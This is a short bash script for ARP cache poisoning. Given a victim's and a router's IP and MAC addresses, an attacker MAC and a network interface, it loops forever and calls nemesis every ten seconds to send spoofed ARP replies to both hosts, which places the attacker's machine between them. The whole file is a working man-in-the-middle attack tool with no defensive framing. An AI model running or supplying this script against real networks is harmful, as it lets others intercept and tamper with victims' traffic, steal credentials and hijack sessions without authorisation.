#!/bin/bash
# ARP packet injection wrapper used to poison ARP cache

client_ip="$1"
client_mac="$2"
router_ip="$3"
router_mac="$4"
attack_mac="$5"
dev="$6"


while true; do
    sudo nemesis arp -v -r -d "$dev" -S "$router_ip" -D "$client_ip" -h "$attack_mac" -m "$client_mac" -H "$attack_mac" -M "$client_mac"
    sudo nemesis arp -v -r -d "$dev" -S "$client_ip" -D "$router_ip" -h "$attack_mac" -m "$router_mac" -H "$attack_mac" -M "$router_mac"
    sleep 10
done
